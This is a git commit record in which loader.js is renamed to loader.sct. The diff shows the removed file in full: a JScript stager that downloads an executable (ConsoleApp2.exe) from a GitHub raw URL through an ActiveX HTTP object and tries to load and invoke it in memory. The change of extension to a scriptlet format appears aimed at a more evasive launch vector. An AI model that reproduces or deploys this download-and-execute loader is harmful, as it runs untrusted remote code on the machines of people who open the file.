b07d3ac36538f701877566a7129222dfcc2a5c24
andrevital771-debug <andrevital771@gmail.com>
2025-11-02 16:55:44 -0300

    Update and rename loader.js to loader.sct

--- loader.js
+++
@@ -1,8 +0,0 @@
-var x = new ActiveXObject("MSXML2.XMLHTTP");
-x.open("GET", "https://raw.githubusercontent.com/andrevital771-debug/Loucura/main/ConsoleApp2.exe", false);
-x.send();
-
-var bytes = x.responseBody;
-var assembly = new ActiveXObject("System.Reflection.Assembly");
-var loaded = assembly.Load(bytes);
-loaded.GetEntryPoint().Invoke(null, null);
